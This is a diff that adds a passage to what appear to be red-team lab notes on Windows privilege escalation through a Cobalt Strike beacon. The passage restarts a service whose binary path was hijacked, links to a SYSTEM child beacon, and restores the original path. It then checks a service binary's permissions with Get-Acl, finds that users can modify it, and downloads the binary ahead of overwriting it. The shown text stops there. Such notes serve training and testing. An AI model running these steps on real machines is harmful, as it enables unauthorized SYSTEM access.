@@ -414,3 +414,56 @@ SERVICE_NAME: Vuln-Service-2
         DEPENDENCIES       : 
         SERVICE_START_NAME : LocalSystem
 ```
+
+**Since the service is currently running (can be seen by running `sc query VulnService2`), we must stop and then start the service to execute our malicious binary as so:**
+
+```
+beacon> run sc stop VulnService2
+beacon> run sc start VulnService2
+
+beacon> connect localhost 4444
+[+] established link to child beacon: 10.10.123.102
+```
+
+**To restore the previous binary path:**
+
+```
+beacon> run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"
+[SC] ChangeServiceConfig SUCCESS
+```
+
+{% hint style="warning" %}
+The additional set of escaped quotes is necessary to ensure that the path remains fully quoted, otherwise you could introduce a new unquoted service path vulnerability.
+{% endhint %}
+
+## Weak Service Binary Permissions
+
+This may seem slightly different than the previous vulnerability, but instead of the weak permissions being on the service, it's on the service binary itself.
+
+```
+beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vulnerable Services\Service 3.exe
+Owner  : BUILTIN\Administrators
+Group  : DEV\Domain Users
+Access : BUILTIN\Users Allow  Modify, Synchronize
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Users Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+Audit  : 
+Sddl   : O:BAG:DUD:AI(A;;0x1301bf;;;BU)(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200
+         a9;;;S-1-15-2-2)
+```
+
+The output above shows that `BUILTIN\Users` have `Modify` privileges over `Service3.exe`.
+
+**This allows us to overwrite the binary with something else (make sure you take a backup first):**
+
+```
+beacon> download Service 3.exe
+[*] started download of C:\Program Files\Vuln Services\Service 3.exe (5120 bytes)
+[*] download of Service 3.exe is complete
+```
+
